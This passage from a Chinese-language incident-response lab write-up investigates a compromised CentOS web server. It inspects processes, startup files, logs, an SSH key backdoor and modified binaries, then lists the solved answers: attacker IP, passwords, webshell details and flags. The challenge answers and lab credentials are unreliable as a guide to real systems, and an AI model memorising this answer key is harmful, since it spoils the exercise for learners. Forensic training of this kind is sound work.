tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      1087/pure-ftpd (SER
tcp        0      0 10.0.2.15:8888          10.0.2.2:54759          ESTABLISHED 2262/python3
tcp        0      0 10.0.2.15:8888          10.0.2.2:60503          ESTABLISHED 2262/python3
tcp        0      0 10.0.2.15:8888          10.0.2.2:56965          ESTABLISHED 2262/python3
tcp        0      0 10.0.2.15:8888          10.0.2.2:51207          ESTABLISHED 2262/python3
tcp        0      0 10.0.2.15:8888          10.0.2.2:62454          ESTABLISHED 2262/python3
tcp        0     36 192.168.242.70:22       192.168.188.6:57813     ESTABLISHED 18592/sshd: root@pt
tcp        0      0 192.168.242.70:22       192.168.188.104:53568   ESTABLISHED 16609/sshd: root@pt
tcp        0      0 10.0.2.15:8888          10.0.2.2:50980          ESTABLISHED 2262/python3
tcp6       0      0 :::22                   :::*                    LISTEN      1017/sshd
tcp6       0      0 ::1:25                  :::*                    LISTEN      1774/master
tcp6       0      0 :::65534                :::*                    LISTEN      1015/LingJingCmd
tcp6       0      0 :::3306                 :::*                    LISTEN      2175/mysqld
tcp6       0      0 :::80                   :::*                    LISTEN      1122/nginx: master
tcp6       0      0 :::21                   :::*                    LISTEN      1087/pure-ftpd (SER

```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500598.png)

### 进程检查
`ps -aux`

```bash
[root@web-server ~]# ps -aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  0.2 191024  3828 ?        Ss   Nov12   0:38 /usr/lib/systemd/systemd --switched-root --system --des
root         2  0.0  0.0      0     0 ?        S    Nov12   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        S<   Nov12   0:00 [kworker/0:0H]
root         5  0.0  0.0      0     0 ?        S    Nov12   0:01 [kworker/u4:0]
root         6  0.0  0.0      0     0 ?        S    Nov12   0:02 [ksoftirqd/0]
root         7  0.0  0.0      0     0 ?        S    Nov12   0:00 [migration/0]
root         8  0.0  0.0      0     0 ?        S    Nov12   0:00 [rcu_bh]
root         9  0.1  0.0      0     0 ?        S    Nov12   0:32 [rcu_sched]
root        10  0.0  0.0      0     0 ?        S<   Nov12   0:00 [lru-add-drain]
root        11  0.0  0.0      0     0 ?        S    Nov12   0:00 [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    Nov12   0:00 [watchdog/1]
root        13  0.0  0.0      0     0 ?        S    Nov12   0:00 [migration/1]
root        14  0.0  0.0      0     0 ?        S    Nov12   0:00 [ksoftirqd/1]
root        16  0.0  0.0      0     0 ?        S<   Nov12   0:00 [kworker/1:0H]
root        18  0.0  0.0      0     0 ?        S    Nov12   0:00 [kdevtmpfs]
root        19  0.0  0.0      0     0 ?        S<   Nov12   0:00 [netns]
root        20  0.0  0.0      0     0 ?        S    Nov12   0:00 [khungtaskd]
root        21  0.0  0.0      0     0 ?        S<   Nov12   0:00 [writeback]
root        22  0.0  0.0      0     0 ?        S<   Nov12   0:00 [kintegrityd]
root        23  0.0  0.0      0     0 ?        S<   Nov12   0:00 [bioset]
root        24  0.0  0.0      0     0 ?        S<   Nov12   0:00 [bioset]
root        25  0.0  0.0      0     0 ?        S<   Nov12   0:00 [bioset]
root        26  0.0  0.0      0     0 ?        S<   Nov12   0:00 [kblockd]
root        27  0.0  0.0      0     0 ?        S<   Nov12   0:00 [md]
root        28  0.0  0.0      0     0 ?        S<   Nov12   0:00 [edac-poller]
root        29  0.0  0.0      0     0 ?        S<   Nov12   0:00 [watchdogd]
root        33  0.0  0.0      0     0 ?        S    Nov12   0:02 [kswapd0]
root        34  0.0  0.0      0     0 ?        SN   Nov12   0:00 [ksmd]
root        35  0.0  0.0      0     0 ?        SN   Nov12   0:00 [khugepaged]
root        36  0.0  0.0      0     0 ?        S<   Nov12   0:00 [crypto]
root        44  0.0  0.0      0     0 ?        S<   Nov12   0:00 [kthrotld]
root        45  0.0  0.0      0     0 ?        S    Nov12   0:00 [kworker/u4:1]
root        46  0.0  0.0      0     0 ?        S<   Nov12   0:00 [kmpath_rdacd]
root        47  0.0  0.0      0     0 ?        S<   Nov12   0:00 [kaluad]
root        48  0.0  0.0      0     0 ?        S<   Nov12   0:00 [kpsmoused]
root        50  0.0  0.0      0     0 ?        S<   Nov12   0:00 [ipv6_addrconf]
root        63  0.0  0.0      0     0 ?        S<   Nov12   0:00 [deferwq]
root       102  0.0  0.0      0     0 ?        S    Nov12   0:00 [kauditd]
root       277  0.0  0.0      0     0 ?        S<   Nov12   0:00 [ata_sff]
root       286  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_0]
root       287  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_0]
root       288  0.0  0.0      0     0 ?        S    Nov12   0:00 [scsi_eh_1]
root       289  0.0  0.0      0     0 ?        S<   Nov12   0:00 [scsi_tmf_1]
root       301  0.0  0.0      0     0 ?        S<   Nov12   0:00 [kworker/1:1H]
root       361  0.0  0.0      0     0 ?        S<   Nov12   0:00 [kdmflush]
root       362  0.0  0.0      0     0 ?        S<   Nov12   0:00 [bioset]
root       371  0.0  0.0      0     0 ?        S<   Nov12   0:00 [kdmflush]
root       372  0.0  0.0      0     0 ?        S<   Nov12   0:00 [bioset]
root       387  0.0  0.0      0     0 ?        S<   Nov12   0:00 [bioset]
root       388  0.0  0.0      0     0 ?        S<   Nov12   0:00 [xfsalloc]
root       389  0.0  0.0      0     0 ?        S<   Nov12   0:00 [xfs_mru_cache]
root       390  0.0  0.0      0     0 ?        S<   Nov12   0:00 [xfs-buf/dm-0]
root       391  0.0  0.0      0     0 ?        S<   Nov12   0:00 [xfs-data/dm-0]
root       392  0.0  0.0      0     0 ?        S<   Nov12   0:00 [xfs-conv/dm-0]
root       393  0.0  0.0      0     0 ?        S<   Nov12   0:00 [xfs-cil/dm-0]
root       394  0.0  0.0      0     0 ?        S<   Nov12   0:00 [xfs-reclaim/dm-]
root       395  0.0  0.0      0     0 ?        S<   Nov12   0:00 [xfs-log/dm-0]
root       396  0.0  0.0      0     0 ?        S<   Nov12   0:00 [xfs-eofblocks/d]
root       397  0.1  0.0      0     0 ?        S    Nov12   0:31 [xfsaild/dm-0]
root       398  0.0  0.0      0     0 ?        S<   Nov12   0:00 [kworker/0:1H]
root       478  0.0  0.1  39056  2564 ?        Ss   Nov12   0:03 /usr/lib/systemd/systemd-journald
root       499  0.0  0.0 124840  1280 ?        Ss   Nov12   0:00 /usr/sbin/lvmetad -f
root       507  0.0  0.0  45456  1780 ?        Ss   Nov12   0:01 /usr/lib/systemd/systemd-udevd
root       551  0.0  0.0      0     0 ?        S<   Nov12   0:00 [kvm-irqfd-clean]
root       553  0.0  0.0      0     0 ?        S<   Nov12   0:00 [ttm_swap]
root       565  0.0  0.0      0     0 ?        S<   Nov12   0:00 [xfs-buf/sda1]
root       566  0.0  0.0      0     0 ?        S<   Nov12   0:00 [xfs-data/sda1]
root       567  0.0  0.0      0     0 ?        S<   Nov12   0:00 [xfs-conv/sda1]
root       568  0.0  0.0      0     0 ?        S<   Nov12   0:00 [xfs-cil/sda1]
root       569  0.0  0.0      0     0 ?        S<   Nov12   0:00 [xfs-reclaim/sda]
root       570  0.0  0.0      0     0 ?        S<   Nov12   0:00 [xfs-log/sda1]
root       571  0.0  0.0      0     0 ?        S<   Nov12   0:00 [xfs-eofblocks/s]
root       572  0.0  0.0      0     0 ?        S    Nov12   0:00 [xfsaild/sda1]
root       589  0.0  0.0  55532   840 ?        S<sl Nov12   0:00 /sbin/auditd
dbus       613  0.0  0.1  58220  2440 ?        Ss   Nov12   0:03 /usr/bin/dbus-daemon --system --address=systemd: --nofo
root       618  0.0  0.0  26424  1700 ?        Ss   Nov12   0:00 /usr/lib/systemd/systemd-logind
root       619  0.0  0.0  21540  1204 ?        Ss   Nov12   0:03 /usr/sbin/irqbalance --foreground
polkitd    620  0.0  0.6 613012 12860 ?        Ssl  Nov12   0:01 /usr/lib/polkit-1/polkitd --no-debug
root       623  0.0  0.0 126392  1560 ?        Ss   Nov12   0:00 /usr/sbin/crond -n
root       640  0.0  1.5 358868 28868 ?        Ssl  Nov12   0:17 /usr/bin/python2 -Es /usr/sbin/firewalld --nofork --nop
root       641  0.0  0.4 550296  9028 ?        Ssl  Nov12   0:09 /usr/sbin/NetworkManager --no-daemon
root       774  0.0  0.2 102912  5448 ?        S    Nov12   0:00 /sbin/dhclient -d -q -sf /usr/libexec/nm-dhcp-helper -p
root      1015  0.0  0.2 1226236 4352 ?        Ssl  Nov12   0:01 /sbin/LingJingCmd
root      1016  0.0  0.9 574284 17352 ?        Ssl  Nov12   0:18 /usr/bin/python2 -Es /usr/sbin/tuned -l -P
root      1017  0.0  0.2 112908  4272 ?        Ss   Nov12   0:00 /usr/sbin/sshd -D
root      1030  0.0  0.1 222740  3504 ?        Ssl  Nov12   0:09 /usr/sbin/rsyslogd -n
root      1087  0.0  0.1 148916  2000 ?        Ss   Nov12   0:00 pure-ftpd (SERVER)
root      1098  0.0  0.2 214208  5484 ?        Ss   Nov12   0:05 php-fpm: master process (/www/server/php/56/etc/php-fpm
www       1103  0.0  0.4 215368  9172 ?        S    Nov12   0:01 php-fpm: pool www
www       1104  0.0  0.4 214340  8060 ?        S    Nov12   0:00 php-fpm: pool www
www       1105  0.0  0.4 214340  8068 ?        S    Nov12   0:01 php-fpm: pool www
www       1106  0.0  0.4 215364  9140 ?        S    Nov12   0:00 php-fpm: pool www
www       1107  0.0  0.4 214340  8160 ?        S    Nov12   0:00 php-fpm: pool www
root      1122  0.0  0.1 115076  2544 ?        Ss   Nov12   0:00 nginx: master process /www/server/nginx/sbin/nginx -c /
www       1123  0.0  1.3 136636 24952 ?        S    Nov12   0:00 nginx: worker process
www       1124  0.0  1.3 136700 24956 ?        S    Nov12   0:00 nginx: worker process
www       1125  0.0  0.1 114860  2804 ?        S    Nov12   0:00 nginx: cache manager process
root      1135  0.0  0.0 115548  1676 ?        S    Nov12   0:01 /bin/sh /www/server/mysql/bin/mysqld_safe --datadir=/ww
www       1333  0.0  0.4 214336  8164 ?        S    Nov12   0:00 php-fpm: pool www
root      1774  0.0  0.1 106888  2512 ?        Ss   Nov12   0:00 /usr/libexec/postfix/master -w
postfix   2020  0.0  0.2 107060  4340 ?        S    Nov12   0:00 qmgr -l -t unix -u
mysql     2175  0.5 11.6 1409920 218740 ?      Sl   Nov12   1:44 /www/server/mysql/bin/mysqld --basedir=/www/server/mysq
root      2262  0.1  4.5 914288 86396 ?        S    Nov12   0:30 /www/server/panel/pyenv/bin/python3 /www/server/panel/B
root      2288  0.5  2.4 1418988 46512 ?       Sl   Nov12   1:50 /www/server/panel/pyenv/bin/python3 /www/server/panel/B
root      2418  0.0  0.0 110208   828 tty1     Ss+  Nov12   0:00 /sbin/agetty --noclear tty1 linux
root     16609  0.0  0.3 161676  6088 ?        Ss   00:57   0:00 sshd: root@pts/0
root     16659  0.0  0.1 115548  1916 pts/0    Ss+  00:58   0:00 -bash
root     17560  0.0  0.0      0     0 ?        R    01:14   0:01 [kworker/0:1]
postfix  17998  0.0  0.2 106992  4308 ?        S    01:22   0:00 pickup -l -t unix -u
root     18315  0.0  0.0      0     0 ?        S    01:27   0:00 [kworker/0:2]
root     18592  0.0  0.3 161676  6112 ?        Rs   01:32   0:00 sshd: root@pts/1
root     18626  0.0  0.1 115548  2004 pts/1    Ss   01:33   0:00 -bash
root     19313  0.0  0.0      0     0 ?        S    01:45   0:00 [kworker/1:0]
root     19806  0.0  0.0      0     0 ?        S    01:54   0:00 [kworker/1:2]
root     20071  0.0  0.0      0     0 ?        S    01:59   0:00 [kworker/1:1]
root     20248  0.0  0.0 155452  1816 pts/1    R+   02:02   0:00 ps -aux

```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458127.png)

### 资源占用检查
`top -c -o %CPU` #按 CPU 占用排序，检查是否有异常高负载进程（如挖矿）

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500131.png)



## <font style="color:rgb(31, 45, 61);">四、开机启动项排查</font>
`/etc/rc.local`#开机启动脚本

内容只有默认的 touch /var/lock/subsys/local，无异常



`/etc/profile`#全局环境变量，每个用户登录时都会加载此文件，攻击者可能在此植入后门

文件主体是 CentOS 默认内容，最后一行是 flag3：

**export flag3="flag{5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ}"**

`~/.bashrc`#root 用户配置



```bash
[root@web-server ~]# cat /etc/rc.local
#!/bin/bash
# THIS FILE IS ADDED FOR COMPATIBILITY PURPOSES
#
# It is highly advisable to create own systemd services or udev rules
# to run scripts during boot instead of using this file.
#
# In contrast to previous versions due to parallel execution during boot
# this script will NOT be run after all other services.
#
# Please note that you must run 'chmod +x /etc/rc.d/rc.local' to ensure
# that this script will be executed during boot.

touch /var/lock/subsys/local
[root@web-server ~]# cat /etc/profile
# /etc/profile

# System wide environment and startup programs, for login setup
# Functions and aliases go in /etc/bashrc

# It's NOT a good idea to change this file unless you know what you
# are doing. It's much better to create a custom.sh shell script in
# /etc/profile.d/ to make custom changes to your environment, as this
# will prevent the need for merging in future updates.

pathmunge () {
    case ":${PATH}:" in
        *:"$1":*)
            ;;
        *)
            if [ "$2" = "after" ] ; then
                PATH=$PATH:$1
            else
                PATH=$1:$PATH
            fi
    esac
}


if [ -x /usr/bin/id ]; then
    if [ -z "$EUID" ]; then
        # ksh workaround
        EUID=`/usr/bin/id -u`
        UID=`/usr/bin/id -ru`
    fi
    USER="`/usr/bin/id -un`"
    LOGNAME=$USER
    MAIL="/var/spool/mail/$USER"
fi

# Path manipulation
if [ "$EUID" = "0" ]; then
    pathmunge /usr/sbin
    pathmunge /usr/local/sbin
else
    pathmunge /usr/local/sbin after
    pathmunge /usr/sbin after
fi

HOSTNAME=`/usr/bin/hostname 2>/dev/null`
HISTSIZE=1000
if [ "$HISTCONTROL" = "ignorespace" ] ; then
    export HISTCONTROL=ignoreboth
else
    export HISTCONTROL=ignoredups
fi

export PATH USER LOGNAME MAIL HOSTNAME HISTSIZE HISTCONTROL

# By default, we want umask to get set. This sets it for login shell
# Current threshold for system reserved uid/gids is 200
# You could check uidgid reservation validity in
# /usr/share/doc/setup-*/uidgid file
if [ $UID -gt 199 ] && [ "`/usr/bin/id -gn`" = "`/usr/bin/id -un`" ]; then
    umask 002
else
    umask 022
fi

for i in /etc/profile.d/*.sh /etc/profile.d/sh.local ; do
    if [ -r "$i" ]; then
        if [ "${-#*i}" != "$-" ]; then
            . "$i"
        else
            . "$i" >/dev/null
        fi
    fi
done

unset i
unset -f pathmunge
export flag3="flag{5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ}"
[root@web-server ~]# cat ~/.bashrc
# .bashrc

# User specific aliases and functions

alias rm='rm -i'
alias cp='cp -i'
alias mv='mv -i'

# Source global definitions
if [ -f /etc/bashrc ]; then
        . /etc/bashrc
fi
alias php56='php56 -c /www/server/php/56/etc/php-cli.ini'
[root@web-server ~]#
```

****

## <font style="color:rgb(31, 45, 61);">五、定时任务排查</font>
```plain
crontab -l
cat /var/spool/cron/*
cat /etc/crontab
cat /etc/cron.d/*
cat /etc/cron.daiy/*
cat /etc/cron.weekly/*
cat /etc/cron.monthly/*
```

`crontab -l`



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500188.png)



## 六、<font style="color:rgb(31, 45, 61);">日志排查</font>
### <font style="color:rgb(31, 45, 61);">1、系统安全日志审计</font>
安全日志文件存放路径：`/var/log/secure`，是ssh登陆成功与否的一个安全日志

`cat /var/log/secure* |grep "Failed" | awk '{print $11}' | sort | uniq -c | sort -nr`

`cat /var/log/secure* |grep "Accepted" |awk '{print $11}' | sort | uniq -c | sort -nr`



```bash
[root@web-server ~]# ls /var/log/secure*
/var/log/secure  /var/log/secure-20240320  /var/log/secure-20251112
[root@web-server ~]#  cat /var/log/secure* | grep "Accepted" | awk '{print $11}' | sort | uniq -c | sort -nr
     10 192.168.20.1
      3 192.168.188.104
      3 192.168.123.70
      2 192.168.188.6
      1 127.0.0.1
[root@web-server ~]#  cat /var/log/secure* | grep "Failed" | awk '{print $11}' | sort | uniq -c | sort -nr
      1 192.168.20.1
      1 192.168.188.104
[root@web-server ~]#
```



### <font style="color:rgb(31, 45, 61);">2、web日志审计</font>
在之前的排查中知道该机器配置有宝塔，即存在web服务，查看web 日志，路径：`/www/wwwlogs/access.log`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458334.png)



下载日志文件后

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458511.png)

利用在线网站进行分析：

[https://logdog.tech/](https://logdog.tech/)





## <font style="color:rgb(31, 45, 61);">七、异常文件排查</font>
### <font style="color:rgb(31, 45, 61);">1、tmp临时文件排查</font>
```bash
[root@web-server ~]# cat ~/.ssh/authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAFuSvTO8J2XD99fFIF1TQnIyJaJtoSrrYWmGySmjv2j root@web-server
[root@web-server ~]# ls -alshrt /tmp
total 20K
   0 drwxrwxrwt.  2 root  root     6 Mar  4  2024 .ICE-unix
   0 drwxrwxrwt.  2 root  root     6 Mar  4  2024 .XIM-unix
   0 drwxrwxrwt.  2 root  root     6 Mar  4  2024 .font-unix
   0 drwxrwxrwt.  2 root  root     6 Mar  4  2024 .X11-unix
   0 drwxrwxrwt.  2 root  root     6 Mar  4  2024 .Test-unix
   0 dr-xr-xr-x. 20 root  root   288 Mar  7  2024 ..
4.0K -rw-r--r--   1 root  root    18 Nov 12 16:29 last_files_set_mode.pl
   0 -rw-------   1 www   www      0 Nov 12 16:45 sess_j405ri6mhq3k116jkssv6q2fg0
   0 -rw-------   1 www   www      0 Nov 12 17:06 sess_fdstos84eb268jb0i5m9lb7j22
4.0K -rw-------   1 root  root  1.1K Nov 12 17:38 backup.conf
   0 -rw-r--r--   1 root  root     0 Nov 12 19:09 bmac_45efe6f3b745ee9a01c692feebf8a19c
   0 -rw-------   1 www   www      0 Nov 12 19:32 sess_20upuk9hc213o6a27civ57msq6
   0 -rw-------   1 www   www      0 Nov 12 20:16 sess_dt251oesapno3rgqbfb6sgavg7
   0 drwx------   3 root  root    17 Nov 12 20:18 systemd-private-1421214b870c4aaf98148edb528e6fc1-systemd-hostnamed.service-ohxqco
   0 srw-rw-rw-   1 www   www      0 Nov 12 20:21 php-cgi-56.sock
4.0K -rw-------   1 mysql mysql    5 Nov 12 20:22 mysql.sock.lock
   0 srwxrwxrwx   1 mysql mysql    0 Nov 12 20:22 mysql.sock
   0 -rw-------   1 www   www      0 Nov 12 20:32 sess_1pap0qq5t1d821q2a3mj9tkup5
   0 -rw-------   1 www   www      0 Nov 12 20:37 sess_om3j9tn4qfu3mfclkcls888ai4
4.0K drwxrwxrwt.  8 root  root  4.0K Nov 12 20:37 .
4.0K -rw-r--r--   1 root  root    10 Nov 12 20:46 .fluah_time
[root@web-server ~]# ls -alshrt /var/tmp
total 4.0K
   0 drwxr-xr-x   3 root root   19 Mar  7  2024 springboot
4.0K drwxr-xr-x. 19 root root 4.0K Mar  7  2024 ..
   0 drwxrwxrwx   2 root root    6 Nov 12 19:09 gopids
   0 drwxrwxrwx   2 root root    6 Nov 12 19:09 other_project
   0 drwx------   3 root root   17 Nov 12 20:18 systemd-private-1421214b870c4aaf98148edb528e6fc1-systemd-hostnamed.service-ZmAiKt
   0 drwxrwxrwt.  6 root root  148 Nov 12 20:20 .
[root@web-server ~]#
```



### <font style="color:rgb(31, 45, 61);">2、ssh目录排查</font>
```bash
[root@web-server ~]# ls -alsh ~/.ssh/
total 12K
   0 drwx------  2 root root  69 Mar 20  2024 .
   0 dr-xr-x---. 6 root root 285 Nov 13 02:27 ..
4.0K -rw-------  1 root root  97 Mar 20  2024 authorized_keys
4.0K -rw-------  1 root root 411 Mar 20  2024 id_ed25519
4.0K -rw-r--r--  1 root root  97 Mar 20  2024 id_ed25519.pub
[root@web-server ~]# stat ~/.ssh/authorized_keys
  File: ‘/root/.ssh/authorized_keys’
  Size: 97              Blocks: 8          IO Block: 4096   regular file
Device: fd00h/64768d    Inode: 978652      Links: 1
Access: (0600/-rw-------)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2025-11-12 20:41:04.885000000 +0800
Modify: 2024-03-20 10:30:24.749402513 +0800
Change: 2025-11-12 16:29:06.402000000 +0800
 Birth: -
[root@web-server ~]#
```

SSH 密钥后门发现异常



  authorized_keys  97字节  创建时间: 2024-03-20 10:30:24

  id_ed25519       私钥

  id_ed25519.pub   公钥



  时间 2024-03-20 10:30 与 last 中 localhost 登录时间完全吻合：



  root  pts/1  localhost  Wed Mar 20 10:30 - 10:30  (00:00)



  这说明攻击者在 03-20 10:30 通过蚁剑：

  1. 生成了 SSH 密钥对（id_ed25519）

  2. 写入了 authorized_keys（免密登录后门）

  3. 本地测试了一次 SSH 登录（localhost，验证密钥是否生效）









### <font style="color:rgb(31, 45, 61);">3、root家目录排查</font>
```bash
[root@web-server ~]# ls -alsh
total 4.6M
   0 dr-xr-x---.  6 root root  285 Nov 13 02:27 .
   0 dr-xr-xr-x. 20 root root  288 Mar  7  2024 ..
4.0K -rw-------.  1 root root 1.3K Mar  4  2024 anaconda-ks.cfg
4.0K -rw-------   1 root root  561 Nov 13 01:27 .bash_history
4.0K -rw-r--r--.  1 root root   18 Dec 29  2013 .bash_logout
4.0K -rw-r--r--.  1 root root  176 Dec 29  2013 .bash_profile
4.0K -rw-r--r--   1 root root  234 Nov 13 00:10 .bashrc
   0 drwxr-xr-x   3 root root   17 Mar  7  2024 .cache
4.0K -rw-r--r--.  1 root root  100 Dec 29  2013 .cshrc
4.0K -rw-------   1 root root  218 Nov 12 21:00 .mysql_history
4.0K -rw-r--r--   1 root root  195 Mar  7  2024 .pearrc
   0 drwxr-xr-x   2 root root   22 Mar  7  2024 .pip
   0 drwxr-----   3 root root   19 Mar  7  2024 .pki
4.0K -rw-------   1 root root 1.0K Mar  7  2024 .rnd
   0 drwx------   2 root root   69 Mar 20  2024 .ssh
4.0K -rw-r--r--.  1 root root  129 Dec 29  2013 .tcshrc
4.0K -rw-------   1 root root 1.4K Nov 13 02:27 .viminfo
1.8M -rwxr-xr-x   1 root root 1.8M Mar 20  2024 wp
2.8M -rw-r--r--   1 root root 2.8M Mar 20  2024 数据包1.pcapng
```

### <font style="color:rgb(31, 45, 61);">4、.pcapng文件流量分析</font>
> 之前已经分析过，不再多此一举
>





## <font style="color:rgb(31, 45, 61);">八、命令替换排查</font>


```bash
echo $PATH
rpm -Vf /usr/sbin/* > 1.txt      #由于环境限制，我们先把执行结果保存下来再进行查看
cat 1.txt | more

  S = Size 大小变化
  5 = MD5 哈希变化
  L = symLink 软链接变化
  T = mTime 修改时间变化
  c = configuration file（配置文件）
```



```bash
[root@web-server ~]# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin
[root@web-server ~]# rpm -Vf /usr/sbin/* > 1.txt
[root@web-server ~]# cat 1.txt
S.5....T.  c /etc/sysconfig/authconfig
S.5....T.  c /etc/sysconfig/authconfig
S.5....T.  c /etc/sysconfig/authconfig
....L....  c /etc/pam.d/fingerprint-auth
....L....  c /etc/pam.d/password-auth
....L....  c /etc/pam.d/postlogin
....L....  c /etc/pam.d/smartcard-auth
....L....  c /etc/pam.d/system-auth
file /usr/sbin/LingJingCmd is not owned by any package
S.5....T.  c /etc/logrotate.conf
....L....  c /etc/pam.d/fingerprint-auth
....L....  c /etc/pam.d/password-auth
....L....  c /etc/pam.d/postlogin
....L....  c /etc/pam.d/smartcard-auth
....L....  c /etc/pam.d/system-auth
....L....  c /etc/pam.d/fingerprint-auth
....L....  c /etc/pam.d/password-auth
....L....  c /etc/pam.d/postlogin
....L....  c /etc/pam.d/smartcard-auth
....L....  c /etc/pam.d/system-auth
....L....  c /etc/pam.d/fingerprint-auth
....L....  c /etc/pam.d/password-auth
....L....  c /etc/pam.d/postlogin
....L....  c /etc/pam.d/smartcard-auth
....L....  c /etc/pam.d/system-auth
....L....  c /etc/pam.d/fingerprint-auth
....L....  c /etc/pam.d/password-auth
....L....  c /etc/pam.d/postlogin
....L....  c /etc/pam.d/smartcard-auth
....L....  c /etc/pam.d/system-auth
....L....  c /etc/pam.d/fingerprint-auth
....L....  c /etc/pam.d/password-auth
....L....  c /etc/pam.d/postlogin
....L....  c /etc/pam.d/smartcard-auth
....L....  c /etc/pam.d/system-auth
.......T.  c /etc/ssh/sshd_config
.......T.  c /etc/ssh/sshd_config
....L....  c /etc/pam.d/fingerprint-auth
....L....  c /etc/pam.d/password-auth
....L....  c /etc/pam.d/postlogin
....L....  c /etc/pam.d/smartcard-auth
....L....  c /etc/pam.d/system-auth
....L....  c /etc/pam.d/fingerprint-auth
....L....  c /etc/pam.d/password-auth
....L....  c /etc/pam.d/postlogin
....L....  c /etc/pam.d/smartcard-auth
....L....  c /etc/pam.d/system-auth
[root@web-server ~]#
```









## <font style="color:rgb(31, 45, 61);">九、被修改的密码</font>
重新看了一下`/etc/shadow`，发现除了www用户还存在mysql 用户，再联想到之前web日志中的phpmyadmin的访问，猜测密码会不会藏在数据库中

```bash
[root@web-server ~]# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
www:x:1000:1000::/home/www:/sbin/nologin
mysql:x:1001:1001::/home/mysql:/sbin/nologin
[root@web-server ~]#
```

数据库的配置文件`lib/config.inc.php`文件中找到数据库的账号密码

`cat /www/wwwroot/127.0.0.1/lib/config.inc.php`



```bash
/** 数据库设置 */
define('SQLDEBUG',0);
define('DB','kaoshi');//MYSQL数据库名
define('DH','127.0.0.1');//MYSQL主机名，不用改
define('DU','kaoshi');//MYSQL数据库用户名
define('DP','5Sx8mK5ieyLPb84m');//MYSQL数据库用户密码
define('DTH','x2_');//系统表前缀，不用改
```



之后就可以登录数据库了







## 十、完整 WP
```bash
[root@web-server ~]# ./wp
提交攻击者IP？
192.168.20.1
回答正确！
提交攻击者修改的管理员密码(明文)
Network@2020
回答正确！
提交第一次Webshell的连接URL（http://xxx.xxx.xxx.xx/abcdefg?abcdefg只需要提交abcdefg?abcdefg）
index.php?user-app-register
回答错误！
提交Webshell连接密码
Network2020
回答正确！
提交数据包的flag1
flag1{Network@_2020_Hack}
回答正确！
提交攻击者使用的后续上传的木马文件名称
version2.php
回答正确！
提交攻击者隐藏的flag2
flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9}
回答正确！
提交攻击者隐藏的flag3
flag{5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ}
回答正确！
[root@web-server ~]#
```

